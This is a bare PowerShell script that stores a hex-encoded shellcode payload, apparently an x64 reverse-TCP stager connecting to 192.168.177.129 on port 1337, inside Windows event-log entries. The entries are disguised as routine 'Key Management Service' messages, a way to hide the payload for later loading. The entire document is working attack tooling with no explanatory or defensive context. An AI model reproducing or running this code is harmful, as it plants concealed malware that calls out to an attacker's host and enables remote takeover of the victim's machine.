﻿$cs = "fc4883e4f0e8cc0000004151415052514831d265488b5260488b521856488b52204d31c9488b7250480fb74a4a4831c0ac3c617c022c2041c1c90d4101c1e2ed52488b522041518b423c4801d0668178180b020f85720000008b80880000004885c074674801d0448b40208b48184901d050e35648ffc9418b34884d31c94801d64831c041c1c90dac4101c138e075f14c034c24084539d175d858448b40244901d066418b0c48448b401c4901d0418b04884801d0415841585e595a41584159415a4883ec204152ffe05841595a488b12e94bffffff5d49be7773325f3332000041564989e64881eca00100004989e549bc02000539c0a8b18141544989e44c89f141ba4c772607ffd54c89ea68010100005941ba29806b00ffd56a0a415e50504d31c94d31c048ffc04889c248ffc04889c141baea0fdfe0ffd54889c76a1041584c89e24889f941ba99a57461ffd585c0740a49ffce75e5e8930000004883ec104889e24d31c96a0441584889f941ba02d9c85fffd583f8007e554883c4205e89f66a404159680010000041584889f24831c941ba58a453e5ffd54889c34989c74d31c94989f04889da4889f941ba02d9c85fffd583f8007d2858415759680040000041586a005a41ba0b2f0f30ffd5575941ba756e4d61ffd549ffcee93cffffff4801c34829c64885f675b441ffe7586a005949c7c2f0b5a256ffd5"
$array = $cs -split '(\w{8000})' | ? {$_}
foreach ($i in $array){
Write-Host "Injecting " + $i.Length + " Bytes"
$hashByteArray = [byte[]] ($i -replace '..', '0x$&,' -split ',' -ne '')
Write-EventLog -LogName 'Key Management Service' -Source KmsRequests -EventId 1337 -EntryType Information -Message 'Key Management Services processed a request successfully' -RawData $hashByteArray
}